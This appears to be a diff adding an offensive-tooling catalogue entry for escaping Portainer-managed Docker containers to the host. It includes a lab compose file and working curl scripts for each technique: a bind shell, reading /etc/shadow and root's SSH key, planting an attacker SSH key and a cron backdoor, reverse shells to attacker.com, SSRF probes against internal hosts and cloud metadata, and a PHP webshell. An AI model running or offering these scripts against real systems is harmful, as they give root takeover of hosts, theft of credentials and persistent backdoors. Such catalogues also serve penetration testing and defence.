@@ -1,0 +1,294 @@
+---
+comment: "Portainer is a Docker/Kubernetes management UI. Authenticated users can\
+  \ create and manage\ncontainers via the REST API or the Stacks (Docker Compose)\
+  \ feature. Because Portainer is\nconnected to the Docker socket, any user who can\
+  \ create containers can escape to the Docker\nhost by deploying a privileged container\
+  \ with the host filesystem bind-mounted at /host and\nrunning chroot /host to obtain\
+  \ a root shell on the underlying OS.\n\nCVE-2021-25437 (CVSS 8.8): Authenticated\
+  \ RCE in Portainer < 1.25.0. The container creation\nendpoint /api/endpoints/<id>/docker/containers/create\
+  \ accepts a privileged container definition\nthat executes arbitrary commands on\
+  \ the Docker host via chroot into the bind-mounted root\nfilesystem.\n\nThe core\
+  \ insight: Portainer socket access equals full host compromise \u2014 Docker socket\
+  \ =\nunrestricted root on the host, regardless of any Portainer RBAC settings.\n"
+docker:
+  compose: "services:\n  portainer:\n    image: portainer/portainer-ce:2.19.0\n  \
+    \  ports:\n      - \"9443:9443\"\n      - \"9000:9000\"\n    volumes:\n      -\
+    \ /var/run/docker.sock:/var/run/docker.sock\n      - portainer_data:/data\nvolumes:\n\
+    \  portainer_data:\n"
+  note: "Starts Portainer CE 2.19.0 connected to the local Docker socket.\nAccess\
+    \ at http://localhost:9000 (HTTP) or https://localhost:9443 (HTTPS).\nOn first\
+    \ run, create an admin account through the setup wizard.\nThe test environment\
+    \ IS Portainer \u2014 demonstrate the privileged container escape by\ncreating\
+    \ a container via the UI under Containers > Add container, enabling Privileged\n\
+    mode and adding the bind mount /:/host under Volumes > map additional volume.\n"
+functions:
+  bind-shell:
+  - code: |
+      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)
+
+      CONTAINER=$(curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "Image": "alpine",
+          "Cmd": ["/bin/sh", "-c",
+            "nc -lvp 4444 -e /bin/sh"],
+          "HostConfig": {
+            "Binds": ["/:/host"],
+            "Privileged": true,
+            "NetworkMode": "host",
+            "PortBindings": {"4444/tcp": [{"HostPort": "4444"}]}
+          },
+          "ExposedPorts": {"4444/tcp": {}}
+        }' | jq -r .Id)
+
+      curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
+        -H "Authorization: Bearer $TOKEN"
+    comment: |
+      Deploys a privileged container in host network mode that listens on TCP port 4444 for
+      an incoming shell connection. Because NetworkMode is host, the port is exposed directly
+      on the Docker host's network interface without a separate port mapping step.
+      Connect from the attacker with: nc victim.com 4444
+      After connecting, run chroot /host /bin/sh to escape to the host OS.
+    connector: tcp-client
+    contexts:
+      authenticated:
+    platform: linux
+    tty: false
+  file-read:
+  - code: |
+      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)
+
+      # Create a container that reads sensitive host files via the /host bind mount
+      CONTAINER=$(curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "Image": "alpine",
+          "Cmd": ["/bin/sh", "-c",
+            "echo === /etc/shadow === && cat /host/etc/shadow && echo === /root/.ssh/id_rsa === && cat /host/root/.ssh/id_rsa 2>/dev/null || echo no key"],
+          "HostConfig": {
+            "Binds": ["/:/host"],
+            "Privileged": true
+          }
+        }' | jq -r .Id)
+
+      curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
+        -H "Authorization: Bearer $TOKEN"
+
+      # Retrieve file contents from container logs
+      curl -s \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/logs?stdout=1&stderr=1" \
+        -H "Authorization: Bearer $TOKEN"
+    comment: |
+      Reads arbitrary files from the Docker host via the privileged container's /host bind mount.
+      The container process runs as root inside the container (privileged mode bypasses all
+      namespace restrictions), so /host/etc/shadow, /host/root/.ssh/id_rsa, and any other
+      host file readable by root are accessible. Output is retrieved from container logs.
+
+      Common targets:
+      - /host/etc/shadow: password hashes
+      - /host/root/.ssh/id_rsa: root SSH private key
+      - /host/etc/docker/daemon.json: Docker daemon configuration
+      - /host/var/lib/docker/volumes/: named volume contents
+    contexts:
+      authenticated:
+    platform: linux
+  file-write:
+  - code: |
+      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)
+
+      # Write an SSH authorized_keys entry to the host root account
+      CONTAINER=$(curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "Image": "alpine",
+          "Cmd": ["/bin/sh", "-c",
+            "mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh && echo \"ssh-ed25519 AAAA...attacker_pubkey... attacker\" >> /host/root/.ssh/authorized_keys && chmod 600 /host/root/.ssh/authorized_keys"],
+          "HostConfig": {
+            "Binds": ["/:/host"],
+            "Privileged": true
+          }
+        }' | jq -r .Id)
+
+      curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
+        -H "Authorization: Bearer $TOKEN"
+
+      # Alternative: plant a cron job for persistent code execution
+      # "Cmd": ["/bin/sh", "-c",
+      #   "echo '* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1' > /host/etc/cron.d/backdoor && chmod 644 /host/etc/cron.d/backdoor"]
+    comment: |
+      Writes arbitrary files to the Docker host filesystem via the privileged container's
+      /host bind mount. The container runs as root in privileged mode, bypassing all
+      filesystem permission checks on the host.
+
+      Common write targets for persistence:
+      - /host/root/.ssh/authorized_keys: grants SSH access as root
+      - /host/etc/cron.d/backdoor: executes commands on a cron schedule
+      - /host/etc/sudoers.d/backdoor: grants passwordless sudo to an existing user
+      - /host/usr/local/bin/<cmd>: replaces a host binary with a backdoored version
+    contexts:
+      authenticated:
+    platform: linux
+  rce:
+  - code: |
+      # Step 1: authenticate and obtain a JWT token
+      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)
+
+      # Step 2: create a privileged container with host root bind-mounted at /host
+      CONTAINER=$(curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "Image": "alpine",
+          "Cmd": ["chroot", "/host", "/bin/sh", "-c", "id; hostname; cat /etc/shadow"],
+          "HostConfig": {
+            "Binds": ["/:/host"],
+            "Privileged": true,
+            "NetworkMode": "host"
+          }
+        }' | jq -r .Id)
+
+      # Step 3: start the container
+      curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
+        -H "Authorization: Bearer $TOKEN"
+
+      # Step 4: retrieve output via logs
+      curl -s \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/logs?stdout=1&stderr=1" \
+        -H "Authorization: Bearer $TOKEN"
+    comment: |
+      Creates a privileged Docker container with the host root filesystem bind-mounted at /host,
+      then uses chroot /host to break out of the container namespace and execute commands as root
+      on the Docker host. The host bind mount gives unrestricted access to the entire host OS.
+
+      Portainer's Stacks (Compose) feature can be used as an alternative: deploy a stack with a
+      privileged service definition. Navigate to Stacks > Add stack, paste a Compose definition
+      with privileged: true and a /:/host volume, then exec into the container.
+
+      Requires authenticated access to Portainer with container creation privileges.
+      CVE-2021-25437 affects Portainer < 1.25.0 specifically, but the privileged container
+      escape is an inherent design consequence of Docker socket exposure on all versions.
+    contexts:
+      authenticated:
+    platform: linux
+  reverse-shell:
+  - blind: true
+    code: |
+      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)
+
+      CONTAINER=$(curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "Image": "alpine",
+          "Cmd": ["/bin/sh", "-c",
+            "apk add -q bash && bash -i >& /dev/tcp/attacker.com/12345 0>&1"],
+          "HostConfig": {
+            "Binds": ["/:/host"],
+            "Privileged": true,
+            "NetworkMode": "host"
+          }
+        }' | jq -r .Id)
+
+      curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
+        -H "Authorization: Bearer $TOKEN"
+    comment: |
+      Deploys a privileged container that issues a bash reverse shell to attacker.com:12345.
+      The container runs on the host network (NetworkMode: host) so the outbound TCP connection
+      originates from the Docker host's IP. The /:/host bind mount is included so post-connection
+      commands can chroot /host to interact with the full host OS.
+      The start request returns immediately; the reverse shell connects asynchronously.
+    contexts:
+      authenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  ssrf:
+  - code: "TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \\\n  -H \"\
+      Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\"\
+      :\"adminpassword\"}' | jq -r .jwt)\n\n# Add a new Docker environment pointing\
+      \ to an internal TCP Docker socket or service.\n# Portainer will attempt to\
+      \ connect to the supplied URL immediately on endpoint creation.\ncurl -s -X\
+      \ POST \"http://portainer.local:9000/api/endpoints\" \\\n  -H \"Authorization:\
+      \ Bearer $TOKEN\" \\\n  -H \"Content-Type: multipart/form-data\" \\\n  -F \"\
+      Name=internal-probe\" \\\n  -F \"EndpointCreationType=1\" \\\n  -F \"URL=tcp://192.168.1.100:2375\"\
+      \n\n# Probe an internal Docker daemon (unauthenticated TCP socket \u2014 common\
+      \ misconfiguration)\ncurl -s -X POST \"http://portainer.local:9000/api/endpoints\"\
+      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: multipart/form-data\"\
+      \ \\\n  -F \"Name=internal-docker\" \\\n  -F \"EndpointCreationType=1\" \\\n\
+      \  -F \"URL=tcp://10.0.0.5:2375\"\n\n# Portainer also supports probing AWS/GCP\
+      \ metadata via the environment URL field:\n# URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+    comment: |
+      Portainer's "Add Environment" feature (Environments > Add environment > Docker Standalone)
+      accepts a TCP or HTTP URL and immediately attempts to connect to it when saving.
+      Supplying an internal IP/port causes Portainer to probe the internal network from the
+      server side, enabling port scanning and service detection via response timing/errors.
+
+      If an internal unauthenticated Docker TCP socket (port 2375) is found, Portainer will
+      register it as a managed environment, giving the attacker full control over that Docker
+      host through the Portainer UI.
+
+      Requires admin or environment management privileges in Portainer.
+      CVE-2022-25356 (CSRF) can be chained with this vector to trigger the request without
+      direct authentication from a victim admin's browser session.
+    contexts:
+      admin:
+      authenticated:
+  webshell:
+  - code: |
+      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)
+
+      CONTAINER=$(curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "Image": "php:8-apache",
+          "Cmd": ["/bin/bash", "-c",
+            "echo '\''<?php if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);}?>'\'' > /var/www/html/shell.php && apache2-foreground"],
+          "HostConfig": {
+            "Binds": ["/:/host"],
+            "Privileged": true,
+            "PortBindings": {"80/tcp": [{"HostPort": "8888"}]}
+          },
+          "ExposedPorts": {"80/tcp": {}}
+        }' | jq -r .Id)
+
+      curl -s -X POST \
+        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
+        -H "Authorization: Bearer $TOKEN"
+
+      # Access the webshell at: http://victim.com:8888/shell.php?c=chroot+/host+id
+    comment: |
+      Deploys a PHP/Apache container with a webshell written to /var/www/html/shell.php on
+      container start. The container has the host root bind-mounted at /host and runs in
+      privileged mode. The webshell is accessible at http://victim.com:8888/shell.php.
+      Use the c parameter with chroot /host <cmd> to execute commands on the Docker host.
+      Example: ?c=chroot+/host+cat+/etc/shadow
+    contexts:
+      authenticated:
+...
